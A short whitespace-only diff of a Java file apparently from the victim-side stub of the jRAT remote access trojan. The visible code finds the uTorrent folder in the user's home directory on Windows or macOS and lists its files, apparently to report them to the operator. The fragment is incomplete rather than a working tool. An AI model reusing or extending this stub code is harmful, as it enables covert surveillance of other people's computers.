@@ -6,7 +6,6 @@ import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet40UTorrentDownload;
 
-
 public class Packet57UTorrentDownloads extends AbstractIncomingPacket {
 
 	@Override
@@ -17,7 +16,7 @@ public class Packet57UTorrentDownloads extends AbstractIncomingPacket {
 		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
 			dir = new File(System.getProperty("user.home") + "/Library/Application Support/uTorrent/");
 		}
-	
+
 		if (dir != null && dir.exists()) {
 			File[] files = dir.listFiles();
 			for (File file : files) {
